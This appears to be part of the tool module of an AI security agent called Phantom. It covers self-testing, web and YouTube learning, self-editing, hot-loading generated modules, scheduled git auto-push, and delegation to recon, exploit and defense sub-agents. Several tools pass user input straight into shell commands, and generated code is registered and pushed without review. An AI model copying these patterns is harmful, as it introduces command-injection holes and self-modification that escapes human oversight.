          const out = execSync("npm test 2>&1", { encoding: "utf-8", timeout: 120000, cwd: phantomDir });
          const tMatch = out.match(/tests\s+(\d+)/i);
          const pMatch = out.match(/pass\s+(\d+)/i);
          const fMatch = out.match(/fail\s+(\d+)/i);
          const dMatch = out.match(/duration_ms\s+(\d+)/);
          if (tMatch || pMatch) {
            const total = parseInt(tMatch?.[1] || pMatch?.[1] || "0");
            const passed = parseInt(pMatch?.[1] || "0");
            const failed = parseInt(fMatch?.[1] || "0");
            const duration = dMatch ? (parseInt(dMatch[1]) / 1000).toFixed(1) + "s" : "?";
            return failed === 0
              ? `✅ ${passed}/${total} tests pass (${duration})`
              : `❌ ${failed} tests failing (${passed}/${total} passed, ${duration})`;
          }
          return `[evolve] Test output:\n${out.slice(0, 1000)}`;
        } catch (e) {
          const out = e.stdout || "";
          const err = e.stderr || "";
          return `[evolve] Test run ${e.status != null ? "failed (exit " + e.status + ")" : "error"}\n${(out + err).slice(0, 1000)}`;
        }
      }

      // @evolve|repair — auto-fix common issues
      if (action === "repair") {
        const repairs = [];

        // Check syntax of all files, try to identify common issues
        const files = [
          "phantom.mjs",
          ...fs.readdirSync(resolve(phantomDir, "lib")).filter(f => f.endsWith(".mjs")).map(f => `lib/${f}`),
        ];
        let fixed = 0, failed = 0;

        for (const file of files) {
          try {
            execSync(`node --check "${resolve(phantomDir, file)}"`, { encoding: "utf-8", timeout: 10000 });
          } catch (e) {
            const errMsg = e.stderr?.toString() || e.message || "";
            repairs.push(`❌ ${file}: ${errMsg.split("\n")[0].slice(0, 120)}`);
            failed++;
          }
        }

        if (!failed) return `✅ All source files pass syntax check. No repair needed.`;

        let result = `🔧 Repair Report\n${repairs.join("\n")}`;
        result += `\n\n⚠️ ${failed} file(s) need manual fix:`;
        result += `\n  1. Read file: @self_read|<file>`;
        result += `\n  2. Edit: @self_edit|<file>|<old>|<new>`;
        result += `\n  3. Validate: @evolve|validate`;
        result += `\n  4. Run tests: @evolve|test`;
        result += `\n\n  Or rollback: git checkout -- <file>`;

        return result;
      }

      return `[evolve] Unknown: "${action}". Try: validate, analyze, test, repair`;
    } catch (e) { return `[evolve Error] ${e.message}`; }
  },

  // ── YOUTUBE CHANNEL LEARN ──
  channel_learn: async (input) => {
    try {
      const channel = input?.trim() || "";
      if (!channel) return `[channel_learn] Usage: @channel_learn|<channel_name_or_url>\n  Fetches recent videos, transcripts, saves to knowledge base.\n  Examples:\n    @channel_learn|Deadoverflow\n    @channel_learn|https://www.youtube.com/@Deadoverflow`;
      const { execSync } = await import("child_process");
      // Check yt-dlp
      try { execSync("command -v yt-dlp", { stdio: "pipe", timeout: 3000 }); } catch { return "[channel_learn] yt-dlp not found. Install: pip install yt-dlp"; }

      // Normalize channel URL
      let url = channel;
      if (!channel.startsWith("http")) url = `https://www.youtube.com/@${channel}/videos`;

      // Fetch channel info
      let channelTitle = channel;
      try { channelTitle = execSync(`yt-dlp --print "channel" --playlist-end 0 "${url}" 2>/dev/null || echo "${channel}"`, { encoding: "utf-8", timeout: 10000 }).trim(); } catch {}

      // List recent videos (flat, no download)
      const raw = execSync(`yt-dlp --flat-playlist --print "%(id)s|%(title)s" --playlist-end 5 "${url}" 2>/dev/null`, { encoding: "utf-8", timeout: 15000 });
      const videos = raw.trim().split("\n").filter(Boolean).map(line => {
        const [id, ...tParts] = line.split("|");
        return { id: id.trim(), title: tParts.join("|").trim() };
      });
      if (!videos.length) return `[channel_learn] No videos found for "${channelTitle}"`;

      let results = [`📺 Channel: "${channelTitle}" — ${videos.length} videos fetched`];
      let learned = [];

      for (const v of videos.slice(0, 3)) { // Limit to 3 for speed
        results.push(`\n  ${v.title}`);
        try {
          const trans = await hackerTools.youtube_transcript(`${v.id} --text-only`);
          if (trans && !trans.startsWith("[youtube_transcript Error]") && !trans.startsWith("[youtube_transcript] Transcript")) {
            const snippet = trans.length > 200 ? trans.slice(0, 200) + "..." : trans;
            results.push(`    📝 ${snippet}`);
            // Save to knowledge base
            const tags = [channelTitle.replace(/[^a-z0-9]/gi, "_").toLowerCase(), "youtube", "channel_learned"];
            const content = `Video: ${v.title}\nSource: ${channelTitle} (YouTube)\nTranscript: ${trans.slice(0, 2000)}`;
            if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
            const slug = `yt_${v.id}_${Date.now()}`;
            fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({ tags, content, created: new Date().toISOString() }, null, 2), "utf-8");
            learned.push(v.title);
          } else {
            results.push(`    ⏭ No transcript (${trans?.slice(0, 40) || "none"})`);
          }
        } catch (e) {
          results.push(`    ⏭ Error: ${e.message.slice(0, 60)}`);
        }
      }

      // Save channel summary to knowledge base
      const summary = `Channel: ${channelTitle}\nURL: ${url}\nVideos analyzed: ${learned.length}/${videos.length}\nTopics: ${learned.join(", ")}`;
      const slug = `channel_${Date.now()}`;
      fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({
        tags: [channelTitle.replace(/[^a-z0-9]/gi, "_").toLowerCase(), "youtube", "channel", "learned"],
        content: summary, created: new Date().toISOString()
      }, null, 2), "utf-8");

      results.push(`\n  ✅ Learned: ${learned.length} videos saved to knowledge base`);
      if (learned.length < videos.length) results.push(`  💡 Tip: More videos available. Re-run with deeper analysis.`);

      return results.join("\n");
    } catch (e) { return `[channel_learn Error] ${e.message}`; }
  },

  // ── TOPIC LEARN ──
  topic_learn: async (input) => {
    try {
      const topic = input?.trim() || "";
      if (!topic) return `[topic_learn] Usage: @topic_learn|<research_topic>\n  Searches web + Wikipedia, fetches top results, saves knowledge.\n  Examples:\n    @topic_learn|OWASP Top 10 vulnerabilities\n    @topic_learn|buffer overflow exploitation techniques`;

      const results = [`🔬 Researching: "${topic}"`];

      // 1. Try DuckDuckGo instant answer
      try {
        const r = await fetch(`https://api.duckduckgo.com/?q=${encodeURIComponent(topic)}&format=json&no_html=1&skip_disambig=1`, { signal: AbortSignal.timeout(8000) });
        const ddg = await r.json();
        if (ddg.AbstractText) {
          results.push(`\n📖 DDG: ${ddg.AbstractText.slice(0, 500)}`);
          // Save
          const fact = `Topic: ${topic}\nSource: DuckDuckGo\n${ddg.AbstractText}`;
          if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
          const slug = `learn_ddg_${Date.now()}`;
          fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({
            tags: [topic.replace(/[^a-z0-9]/gi, "_").toLowerCase().slice(0, 30), "web_learned"],
            content: fact.slice(0, 3000),
            created: new Date().toISOString()
          }, null, 2), "utf-8");
          results.push(`  ✅ Saved to knowledge`);
        }
        if (ddg.Infobox?.content?.length) {
          const infobox = ddg.Infobox.content.filter(c => c.label && c.value && typeof c.value === "string").slice(0, 6).map(c => `  ${c.label}: ${c.value}`).join("\n");
          if (infobox) results.push(`\n📋 Info:\n${infobox}`);
        }
      } catch {}

      // 2. Wikipedia search
      try {
        const r = await fetch(`https://en.wikipedia.org/w/api.php?action=query&list=search&srsearch=${encodeURIComponent(topic)}&format=json&srlimit=3`, { signal: AbortSignal.timeout(8000) });
        const wiki = await r.json();
        const pages = wiki?.query?.search || [];
        if (pages.length) {
          results.push(`\n📚 Wikipedia (${pages.length}):`);
          for (const p of pages.slice(0, 3)) {
            const snippet = p.snippet.replace(/<[^>]+>/g, "").replace(/&amp;/g, "&").replace(/&quot;/g, '"').replace(/&#39;/g, "'");
            results.push(`  • ${p.title} — ${snippet.slice(0, 200)}`);
            // Save each relevant page
            const fact = `Topic: ${topic}\nWikipedia: ${p.title}\n${snippet.slice(0, 1000)}`;
            const slug = `learn_wiki_${Date.now()}`;
            fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({
              tags: [p.title.replace(/[^a-z0-9]/gi, "_").toLowerCase().slice(0, 30), "wikipedia", "web_learned"],
              content: fact.slice(0, 3000),
              created: new Date().toISOString()
            }, null, 2), "utf-8");
          }
        }
      } catch {}

      // 3. Try to fetch a top web result (generic web search)
      try {
        const r = await fetch(`https://lite.duckduckgo.com/lite/?q=${encodeURIComponent(topic)}`, {
          headers: { "User-Agent": "Mozilla/5.0" },
          signal: AbortSignal.timeout(8000)
        });
        const html = await r.text();
        const links = html.match(/<a[^>]*href="([^"]*)"[^>]*class="[^"]*result-link[^"]*"[^>]*>/gi) || [];
        if (links.length) {
          // Try fetching first result
          const firstUrl = links[0].match(/href="(https?:\/\/[^"]+)"/)?.[1];
          if (firstUrl) {
            try {
              const fr = await fetch(firstUrl, { signal: AbortSignal.timeout(8000) });
              const text = await fr.text();
              const cleaned = text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
                .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
                .replace(/<[^>]+>/g, " ")
                .replace(/\s+/g, " ").trim().slice(0, 1500);
              if (cleaned.length > 200) {
                const fact = `Topic: ${topic}\nSource: ${firstUrl}\n${cleaned}`;
                const slug = `learn_web_${Date.now()}`;
                fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({
                  tags: [topic.replace(/[^a-z0-9]/gi, "_").toLowerCase().slice(0, 30), "web_learned"],
                  content: fact.slice(0, 3000),
                  created: new Date().toISOString()
                }, null, 2), "utf-8");
                results.push(`\n🌐 ${firstUrl}\n  ${cleaned.slice(0, 300)}`);
              }
            } catch {}
          }
        }
      } catch {}

      results.push(`\n✅ Research complete. Check @learn|search|${topic.replace(/[^a-z0-9]/gi, "_").slice(0, 20)}`);
      return results.join("\n");
    } catch (e) { return `[topic_learn Error] ${e.message}`; }
  },

  // ── SELF-IMPROVEMENT ENGINE ──────────────────────────────
  self_improve: async (input) => {
    try {
      const { fullImprovementCycle, selfImproveStatus } = await import("./self_improve.mjs");
      const args = input.trim();

      if (!args) {
        const status = selfImproveStatus();
        const lines = [
          `🧬 Phantom Self-Improvement Engine`,
          ``,
          `Generation: ${status.generation}`,
          `Improvement cycles run: ${status.cyclesRun}`,
          `Features imported: ${status.featuresImported.length}`,
          `Patterns learned: ${status.patternsLearned.length}`,
          `Current tool count: ${status.selfOverview.tools}`,
          `Architecture features: ${Object.entries(status.selfOverview.architecture).filter(([,v]) => v).length}/${Object.keys(status.selfOverview.architecture).length}`,
          ``,
          `Usage:`,
          `  @self_improve|<git_url|local_path>   Learn from a project`,
          `  @self_improve|status                  Show improvement status`,
          `  @self_improve|scan                    Scan self for gaps`,
          ``,
          `Related commands:`,
          `  @self_evolve       Improve Phantom from its own source code`,
          `  @self_edit|read|<path>   Read any Phantom source file`,
          `  @self_edit|edit|<p>||<o>||<n>   Edit a source file`,
          `  @auto_apply|all    Apply + register generated modules now`,
          `  @auto_apply|register|<name>   Hot-load a learned module`,
          ``,
          `Examples:`,
          `  @self_improve|https://github.com/user/repo.git`,
          `  @self_improve|/path/to/project`,
          `  @self_improve|scan`,
        ];
        return lines.join("\n");
      }

      if (args === "status") {
        const status = selfImproveStatus();
        const lines = [
          `🧬 Self-Improvement Status`,
          ``,
          `Generation: ${status.generation}`,
          `Improvement Cycles: ${status.cyclesRun}`,
          `Features Imported (${status.featuresImported.length}):`,
          ...status.featuresImported.map(f => `  \u2022 ${f}`),
          ``,
          `Patterns Learned: ${status.patternsLearned.length}`,
          ...status.patternsLearned.map(p => `  \u2022 ${p}`),
          ``,
          `Generated Modules: ${status.generatedFiles.length}`,
          ...status.generatedFiles.map(f => `  \u2022 ${f}`),
          ``,
          `Current Self-Scan:`,
          `  Tools: ${status.selfOverview.tools}`,
          `  Exports: ${status.selfOverview.exports}`,
          `  Architecture: ${Object.entries(status.selfOverview.architecture).filter(([,v]) => v).length}/${Object.keys(status.selfOverview.architecture).length}`,
          `  Missing features: ${status.selfOverview.gaps.length > 0 ? status.selfOverview.gaps.join(", ") : "none"}`,
        ];
        return lines.join("\n");
      }

      if (args === "scan") {
        const { analyzeSelf } = await import("./self_improve.mjs");
        const self = analyzeSelf();
        const lines = [
          `🔍 Self-Scan Results`,
          ``,
          `Tools: ${self.tools.length}`,
          `Export Functions: ${self.exports.length}`,
          `Source Files: ${self.files.length}`,
          ``,
          `Architecture:`,
          ...Object.entries(self.architecture).map(([k, v]) => `  ${v ? "✅" : "⬜"} ${k.replace(/([A-Z])/g, " $1").replace(/^./, s => s.toUpperCase())}`),
          ``,
          `Features (${self.features.filter(f => f.present).length} present, ${self.features.filter(f => !f.present).length} missing):`,
          ...self.features.filter(f => f.present).slice(0, 20).map(f => `  ✅ ${f.name}`),
          ...(self.features.filter(f => !f.present).length ? [
            `Missing (potential gaps):`,
            ...self.features.filter(f => !f.present).map(f => `  ⬜ ${f.name}`),
          ] : []),
          ``,
          `To learn from a project: @self_improve|<git_url|local_path>`,
        ];
        return lines.join("\n");
      }

      const report = await fullImprovementCycle(args);
      const elapsed = (report.elapsed / 1000).toFixed(1);
      const lines = [
        `🧬 Self-Improvement Complete`,
        `══════════════════════════`,
        `Target: ${report.project?.name || report.target}`,
        `Elapsed: ${elapsed}s`,
        ``,
        `Project Analysis:`,
        `  Files: ${report.project?.scan?.fileCount || 0}`,
        `  Languages: ${Object.entries(report.project?.scan?.languages || {}).map(([k, v]) => k+"("+v+")").join(", ")}`,
        `  Tool-like exports: ${(report.project?.scan?.tools || []).length}`,
        `  Module system: ${report.project?.scan?.patterns?.moduleSystem || "unknown"}`,
        ``,
        `Phantom Current:`,
        `  Tools: ${report.selfAnalysis?.tools || 0}`,
        `  Feature coverage: ${report.selfAnalysis?.featureCount || 0}%`,
        ``,
        `Gaps Found: ${report.gaps.length}`,
      ];
      const high = report.gaps.filter(g => g.priority === "high");
      const med = report.gaps.filter(g => g.priority === "medium");
      if (high.length > 0) { lines.push(`  🔴 HIGH (${high.length}):`); high.forEach(g => lines.push(`    \u2022 ${g.feature} — ${g.description}`)); }
      if (med.length > 0) { lines.push(`  🟡 MEDIUM (${med.length}):`); med.forEach(g => lines.push(`    \u2022 ${g.feature} — ${g.description}`)); }
      lines.push(`  🔵 Low: ${report.gaps.filter(g => g.priority === "low").length}`);
      lines.push(``, `Generated Code: ${report.generated.length}`);
      for (const gen of report.generated) {
        lines.push(`  ✅ ${gen.gap} → ${gen.file.replace(homedir(), "~")}`);
      }
      lines.push(``, `Validation: ${report.applied.length}/${report.generated.length} passed`);
      lines.push(``, `Patterns saved: ${report.patternsSaved || "none"}`);
      if (report.gitSyncDue) {
        lines.push(``, `⏰ Git push scheduled for ${report.gitSyncNext} is due!`, `  Run @git_sync|push to publish improvements.`);
      }
      return lines.join("\n");
    } catch (e) {
      return `[self_improve Error] ${e.message}`;
    }
  },

  learn_from: async (input) => {
    try {
      const { cloneOrLocate, scanProject, extractPatterns, savePatterns } = await import("./self_improve.mjs");
      const args = input.trim();
      if (!args) {
        return `[learn_from] Usage: @learn_from|<git_url|local_path>
  Analyzes a project's structure and patterns without generating code.
  Examples:
    @learn_from|https://github.com/user/repo.git
    @learn_from|/path/to/project`;
      }
      const project = cloneOrLocate(args);
      const scan = scanProject(project.path);
      const patterns = extractPatterns(project.path);
      const patternPath = savePatterns(project.name, patterns);
      const lines = [
        `📖 Project Analysis: ${project.name}`,
        `══════════════════════════`,
        `Path: ${project.path}`,
        `Type: ${project.isRemote ? "Remote (cloned)" : "Local"}`,
        ``,
        `Structure:`,
        `  Files: ${scan.fileCount}`,
        `  Languages: ${Object.entries(scan.languages).sort((a, b) => b[1] - a[1]).map(([k, v]) => k+" ("+v+")").join(", ")}`,
        `  Entry points: ${scan.entryPoints.join(", ") || "none detected"}`,
        `  Directories: ${scan.structure.dirs?.join(", ") || "none"}`,
        ``,
        `Tool-like Functions (${scan.tools.length}):`,
        ...scan.tools.slice(0, 15).map(t => `  \u2022 ${t.name} → ${t.file}`),
        ...(scan.tools.length > 15 ? [`  ... and ${scan.tools.length - 15} more`] : []),
        ``,
        `Exports (${scan.exports.length}):`,
        ...scan.exports.slice(0, 10).map(e => `  \u2022 ${e.name} → ${e.file}`),
        ...(scan.exports.length > 10 ? [`  ... and ${scan.exports.length - 10} more`] : []),
        ``,
        `Patterns saved to: ${patternPath}`,
      ];
      return lines.join("\n");
    } catch (e) {
      return `[learn_from Error] ${e.message}`;
    }
  },

  self_show_gaps: async () => {
    try {
      const { analyzeSelf } = await import("./self_improve.mjs");
      const self = analyzeSelf();
      const missing = self.features.filter(f => !f.present);
      const present = self.features.filter(f => f.present);
      const lines = [
        `🔍 Phantom Gap Analysis`,
        `Feature Coverage: ${present.length}/${self.features.length}`,
        ``,
        ...present.map(f => `  ✅ ${f.name}`),
      ];
      if (missing.length > 0) {
        lines.push(``, `Missing Features (potential improvements):`);
        missing.forEach(m => lines.push(`  ⬜ ${m.name}`));
      }
      return lines.join("\n");
    } catch (e) {
      return `[self_show_gaps Error] ${e.message}`;
    }
  },

  apply_improvements: async (input) => {
    try {
      const GENERATED_DIR = resolve(homedir(), "Phantom", "lib", "generated");
      const args = input.trim();
      if (!fs.existsSync(GENERATED_DIR)) return `[apply_improvements] No generated modules found.`;
      const files = fs.readdirSync(GENERATED_DIR).filter(f => f.endsWith(".mjs"));
      if (!args) {
        return `📦 Generated Modules (${files.length}):\n${files.map(f => `  \u2022 ${f}`).join("\n")}\n\nUsage: @apply_improvements|<name> | all | validate | clean`;
      }
      if (args === "validate") {
        const { execSync } = await import("child_process");
        const results = await Promise.all(files.map(async (f) => {
          try { const cmd = 'node --check "' + resolve(GENERATED_DIR, f) + '"'; execSync(cmd, { encoding: "utf-8", timeout: 10000 }); return `  ✅ ${f}`; }
          catch (e) { return `  ⚠ ${f}: ${e.stderr?.slice(0, 100) || e.message}`; }
        }));
        return `Syntax Validation:\n${results.join("\n")}`;
      }
      if (args === "clean") {
        let count = 0;
        for (const f of files) { fs.unlinkSync(resolve(GENERATED_DIR, f)); count++; }
        return `🧹 Removed ${count} generated module(s)`;
      }
      if (args === "all") {
        const { execSync } = await import("child_process");
        const learnedDir = resolve(homedir(), "Phantom", "lib", "learned");
        if (!fs.existsSync(learnedDir)) fs.mkdirSync(learnedDir, { recursive: true });
        let applied = 0;
        for (const f of files) {
          try {
            fs.copyFileSync(resolve(GENERATED_DIR, f), resolve(learnedDir, f));
            execSync(`node --check "${resolve(learnedDir, f)}"`, { encoding: "utf-8", timeout: 10000 });
            applied++;
          } catch {}
        }
        return `✅ Applied ${applied}/${files.length} module(s) to lib/learned/.\nRestart Phantom to load them.`;
      }
      const target = files.find(f => f.startsWith(args) || f === `${args}.mjs`);
      if (!target) return `[apply_improvements] Not found: ${args}. Available: ${files.join(", ")}`;
      const learnedDir = resolve(homedir(), "Phantom", "lib", "learned");
      if (!fs.existsSync(learnedDir)) fs.mkdirSync(learnedDir, { recursive: true });
      fs.copyFileSync(resolve(GENERATED_DIR, target), resolve(learnedDir, target));
      return `✅ Applied ${target} → lib/learned/`;
    } catch (e) {
      return `[apply_improvements Error] ${e.message}`;
    }
  },

  // ── SELF-EVOLVE — improve Phantom's own codebase ──────────
  self_evolve: async (input) => {
    try {
      const { selfEvolve } = await import("./self_improve.mjs");
      const report = await selfEvolve();
      const lines = [`🧬 Self-Evolution Complete`, `Target: ${report.target}`];
      if (report.gapsFound !== undefined) lines.push(`Gaps found: ${report.gapsFound}`);
      lines.push(`Generated: ${report.generated.length}`);
      lines.push(`Applied: ${report.applied.length}`);
      if (report.errors.length) lines.push(`Errors: ${report.errors.length}`, ...report.errors.map(e => `  ❌ ${e.tool || e.phase}: ${e.error.slice(0, 200)}`));
      lines.push(`Elapsed: ${(report.elapsed / 1000).toFixed(1)}s`);
      return lines.join("\n");
    } catch (e) { return `[self_evolve Error] ${e.message}`; }
  },

  // ── SELF-EDIT — read/write Phantom's own source files ─────
  self_edit: async (input) => {
    try {
      const { readSelfSource, editSelfFile } = await import("./self_improve.mjs");
      const args = input.trim();
      if (!args) return `[self_edit] Usage:\n  @self_edit|read|<relative_path>          Read a source file\n  @self_edit|edit|<path>||<old>||<new>   Edit a source file (use || as separator)`;
      const parts = args.split("|");
      const cmd = parts[0];
      if (cmd === "read") {
        const result = readSelfSource(parts[1]);
        if (result.error) return `[self_edit] Error: ${result.error}`;
        return `📄 ${parts[1]} (${result.lines} lines, ${result.size}b)\n---\n${result.content.slice(0, 10000)}${result.truncated ? "\n...(truncated at 50KB)" : ""}`;
      }
      if (cmd === "edit") {
        const path = parts[1];
        const oldStr = parts[2] || "";
        const newStr = parts[3] || "";
        if (!path || !oldStr) return `[self_edit] Usage: self_edit|edit|<path>||<old>||<new>`;
        const result = editSelfFile(path, oldStr, newStr);
        if (!result.ok) return `[self_edit] Edit failed: ${result.error}`;
        return `✅ Edited ${path}`;
      }
      return `[self_edit] Unknown command: ${cmd}`;
    } catch (e) { return `[self_edit Error] ${e.message}`; }
  },

  // ── AUTO-APPLY — register generated modules into hackerTools ──
  auto_apply: async (input) => {
    try {
      const { autoApplyGenerated } = await import("./self_improve.mjs");
      const args = (input || "").trim().split("|");
      const cmd = args[0] || "all";

      if (cmd === "all") {
        const results = autoApplyGenerated();
        const applied = results.filter(r => r.status === "applied");
        const errors = results.filter(r => r.status !== "applied");
        const lines = [`📦 Auto-Apply Results`];
        if (applied.length) {
          // Register each applied module into hackerTools dynamically
          for (const r of applied) {
            try {
              const mod = await import(`./learned/${r.file}?t=${Date.now()}`);
              const fn = mod.default || mod.execute;
              if (typeof fn === "function") hackerTools[r.toolName] = fn;
            } catch (e) {
              r.runtimeError = e.message;
            }
          }
          lines.push(`Applied: ${applied.map(r => r.file + (r.runtimeError ? ` (runtime err: ${r.runtimeError})` : "")).join(", ")}`);
        }
        if (errors.length) lines.push(`Errors: ${errors.map(r => `${r.file}: ${r.error}`).join(", ")}`);
        return lines.join("\n");
      }

      if (cmd === "register") {
        const name = args[1];
        if (!name) return `[auto_apply] Usage: auto_apply|register|<toolName>`;
        const mod = await import(`./learned/${name}.mjs?t=${Date.now()}`);
        const fn = mod.default || mod.execute;
        if (typeof fn !== "function") return `[auto_apply] ${name}.mjs has no default export`;
        hackerTools[name] = fn;
        return `✅ Registered ${name} in hackerTools at runtime`;
      }

      if (cmd === "unregister") {
        const name = args[1];
        if (!name) return `[auto_apply] Usage: auto_apply|unregister|<toolName>`;
        if (hackerTools[name]) {
          delete hackerTools[name];
          return `✅ Unregistered ${name} from hackerTools`;
        }
        return `[auto_apply] ${name} not found in hackerTools`;
      }

      return `[auto_apply] Usage: all | register|<name> | unregister|<name>`;
    } catch (e) { return `[auto_apply Error] ${e.message}`; }
  },

  // ── GIT SYNC — smart push with conflict detection and scheduling ──
  git_sync: async (input) => {
    try {
      const { execSync } = await import("child_process");
      const args = (input || "").trim().split("|");
      const cmd = args[0] || "status";

      const PHANTOM_DIR = resolve(import.meta.dirname, "..");
      const run = (c) => execSync(c, { cwd: PHANTOM_DIR, encoding: "utf-8", timeout: 30000 });

      if (cmd === "status") {
        const branch = run("git rev-parse --abbrev-ref HEAD").trim();
        const remote = run("git remote get-url origin 2>/dev/null || echo 'no remote'").trim();
        const changes = run("git status --short lib/learned/ lib/").trim() || "none";
        const ahead = run("git rev-list --count @{u}..HEAD 2>/dev/null || echo 0").trim();
        return [
          `📍 Git Sync Status`,
          `Branch: ${branch}`,
          `Remote: ${remote}`,
          `Local changes: ${changes === "none" ? "none" : "\n" + changes}`,
          `Commits ahead: ${ahead}`,
        ].join("\n");
      }

      if (cmd === "push") {
        // 1. Fetch remote to detect conflicts
        run("git fetch origin 2>&1");

        // 2. Check which learned modules exist remotely
        const remoteFiles = {};
        try {
          const raw = run("git ls-tree -r origin/main --name-only 2>/dev/null | grep 'lib/learned/' || true").trim();
          if (raw) raw.split("\n").forEach(f => { remoteFiles[f] = true; });
        } catch {}

        // 3. Rename local files that conflict with remote
        const conflicts = [];
        const localFiles = run("git status --short lib/learned/ 2>/dev/null || true").trim();
        if (localFiles && localFiles !== "none" && localFiles !== "") {
          for (const line of localFiles.split("\n")) {
            const f = line.trim().slice(2).trim();
            if (remoteFiles[f]) {
              const base = f.replace(/\.mjs$/, "");
              let v = 2;
              let newName;
              while (remoteFiles[`${base}_v${v}.mjs`] || remoteFiles[`lib/learned/${base}_v${v}.mjs`]) v++;
              newName = `${base}_v${v}.mjs`;
              run(`mv "${f}" "${newName}"`);
              conflicts.push(`${f} → ${newName}`);
            }
          }
        }

        // 4. Stage and commit
        run("git add lib/learned/ lib/ 2>&1");
        const staged = run("git diff --cached --name-only 2>&1 || true").trim();
        if (!staged) return "📭 Nothing new to push.";

        const msg = [`[auto-sync] Batch improvement push`];
        if (conflicts.length) msg.push(`Conflicts renamed: ${conflicts.join(", ")}`);
        msg.push(`\nFiles:\n${staged}`);
        run(`git commit -m "${msg.join(" - ")}" 2>&1`);

        // 5. Push with retry (pull --rebase on conflict, retry)
        let attempts = 0;
        const maxAttempts = 3;
        let pushResult;
        while (attempts < maxAttempts) {
          attempts++;
          try {
            run("git push origin main 2>&1");
            pushResult = `✅ Pushed successfully${conflicts.length ? ` (${conflicts.length} conflicts renamed)` : ""}`;
            // Reschedule if on timer
            try {
              const st2 = JSON.parse(fs.readFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), "utf-8"));
              if (st2.gitSync?.scheduledDays) {
                st2.gitSync.nextPush = Date.now() + st2.gitSync.scheduledDays * 86400000;
                st2.gitSync.lastPush = new Date().toISOString();
                fs.writeFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), JSON.stringify(st2, null, 2));
                pushResult += `\n📅 Next push: ${new Date(st2.gitSync.nextPush).toISOString().slice(0, 10)}`;
              }
            } catch {}
            return pushResult;
          } catch (e) {
            if (attempts >= maxAttempts) throw new Error(`Push failed after ${maxAttempts} attempts: ${e.stderr?.slice(0, 200)}`);
            run("git pull --rebase origin main 2>&1");
          }
        }
        return "✅ Push complete (after rebase)";
      }

      if (cmd === "schedule") {
        const interval = parseInt(args[1]);
        if (isNaN(interval) || interval < 1) return "[git_sync] Usage: git_sync|schedule|<days> — e.g. git_sync|schedule|3 for every 3 days";
        const st = JSON.parse(fs.readFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), "utf-8"));
        st.gitSync = { ...(st.gitSync || {}), scheduledDays: interval, nextPush: Date.now() + interval * 86400000 };
        fs.mkdirSync(resolve(homedir(), ".config", "phantom"), { recursive: true });
        fs.writeFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), JSON.stringify(st, null, 2));
        return `⏰ Scheduled auto-push every ${interval} day(s). Next push: ${new Date(st.gitSync.nextPush).toISOString().slice(0, 10)}`;
      }

      if (cmd === "nextpush") {
        const st = JSON.parse(fs.readFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), "utf-8"));
        const gs = st.gitSync || {};
        if (!gs.nextPush) return "📭 No push scheduled. Use @git_sync|schedule|<days>.";
        const due = Date.now() >= gs.nextPush;
        return `Next scheduled push: ${new Date(gs.nextPush).toISOString().slice(0, 10)}${due ? " ⏰ DUE NOW" : ""}`;
      }

      if (cmd === "check") {
        // Check if scheduled push is due — auto-push if so
        const st = JSON.parse(fs.readFileSync(resolve(homedir(), ".config", "phantom", "evolve.json"), "utf-8"));
        const gs = st.gitSync || {};
        if (!gs.nextPush) return "📭 No push scheduled.";
        if (Date.now() < gs.nextPush) {
          const remaining = Math.ceil((gs.nextPush - Date.now()) / 86400000);
          return `⏳ Next push in ${remaining} day(s). Not due yet.`;
        }
        // Due — run push (re-trigger via same tool)
        return await hackerTools.git_sync("push");
      }

      if (cmd === "pull") {
        run("git pull --ff-only origin main 2>&1");
        const now = run("git rev-parse --short HEAD").trim();
        return `✅ Pulled — now at ${now}`;
      }

      return `[git_sync] Usage: status | push | schedule|<days> | nextpush | check | pull`;

    } catch (e) { return `[git_sync Error] ${e.message}`; }
  },

  // ── PARALLEL — auto-split task and run on sub-agents concurrently ──
  parallel: async (input) => {
    if (!input || !input.trim()) return `[parallel] Usage: @parallel|task_description\n  Auto-splits complex tasks and runs on available agents (Nova, Orion, Vega).`;
    try {
      const mgr = globalThis.__phantomManager;
      if (!mgr) return "[parallel] Agent system not initialized.";
      const agents = mgr.list.filter(a => a.role !== "cybersecurity-ai"); // exclude main agent
      if (agents.length < 2) return "[parallel] Need at least 2 sub-agents. Available: " + mgr.list.map(a => a.name).join(", ");

      // Run parallel: each sub-agent gets the same task with role-appropriate framing
      const task = input.trim();
      const from = mgr.list[0] || agents[0];
      const callerId = from.id;

      // Set all targets to delegated
      agents.forEach(a => { a.status = "delegated"; });

      const results = await Promise.all(agents.map(async agent => {
        const framedTask = `[PARALLEL TASK — ${agent.role} perspective]\\n${task}\\n\\nAnalyze this from your ${agent.role} specialty. Use your available tools. Report your findings concisely.`;
        const result = await agent.receive("system", framedTask);
        return `[${agent.name} — ${agent.role}]\\n${result}`;
      }));

      agents.forEach(a => { a.status = "idle"; });

      // Synthesize via first sub-agent or main
      const synthesized = await mgr.synthesize(callerId, task, results.join("\\n\\n---\\n\\n"));
      return `[Parallel Results]\\n\\n${synthesized}`;
    } catch (e) { return `[parallel Error] ${e.message}`; }
  },

  // ── DELEGATE — route a task to a specific named agent ──
  delegate: async (input) => {
    if (!input || !input.trim()) return `[delegate] Usage: @delegate|agent_name|task\n  Agents: Nova (recon), Orion (exploit), Vega (defense)`;
    try {
      const parts = input.split("|").map(s => s.trim());
      const agentName = parts[0];
      const task = parts.slice(1).join("|");
      if (!agentName || !task) return `[delegate] Usage: @delegate|agent_name|task`;

      const mgr = globalThis.__phantomManager;
      if (!mgr) return "[delegate] Agent system not initialized.";

      const target = mgr.findAgent(agentName);
